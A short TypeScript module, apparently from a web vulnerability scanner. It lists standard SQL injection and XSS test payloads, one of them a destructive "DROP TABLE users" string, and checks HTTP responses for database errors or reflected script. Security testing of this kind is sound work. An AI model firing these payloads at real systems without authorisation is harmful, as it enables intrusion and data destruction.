import type { HttpResponse } from './index.js';

/**
 * Get security payloads for a specific vulnerability type
 */
export function getPayloads(type: string): string[] {
  const payloads: Record<string, string[]> = {
    sqli: [
      "' OR '1'='1",
      "admin' --",
      "' UNION SELECT NULL, NULL --",
      "' OR 1=1 --",
      "'; DROP TABLE users; --",
    ],
    xss: [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "javascript:alert(1)",
      "';alert(1)//",
      "\"><script>alert(1)</script>",
    ],
  };

  return payloads[type] || [];
}

/**
 * Check a response for signs of a successful exploit
 */
export function checkVulnerability(response: HttpResponse, type: string): { vulnerable: boolean; evidence?: string } {
  const body = response.body.toLowerCase();
  
  if (type === 'sqli') {
    const sqliErrors = [
      'sql syntax',
      'mysql_fetch_array',
      'unclosed quotation mark',
      'postgresql error',
      'oracle error',
    ];
    for (const err of sqliErrors) {
      if (body.includes(err)) {
        return { vulnerable: true, evidence: `Database error found: ${err}` };
      }
    }
  }

  if (type === 'xss') {
    // Simple reflection check
    if (response.url.includes('alert(1)') && body.includes('alert(1)')) {
      return { vulnerable: true, evidence: 'Payload reflected in response body' };
    }
  }

  return { vulnerable: false };
}